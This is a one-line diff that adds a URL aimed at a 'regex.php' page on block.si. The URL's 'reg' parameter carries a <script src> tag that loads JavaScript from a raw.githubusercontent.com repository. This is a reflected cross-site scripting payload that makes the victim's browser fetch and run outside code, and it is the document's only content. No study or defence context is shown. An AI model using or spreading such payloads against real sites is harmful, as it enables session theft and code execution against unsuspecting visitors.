@@ -1,0 +1,1 @@
+http://block.si/regex.php?url&reg=<script src="https://raw.githubusercontent.com/tomcatjp/repotest/main/link.js"></script>
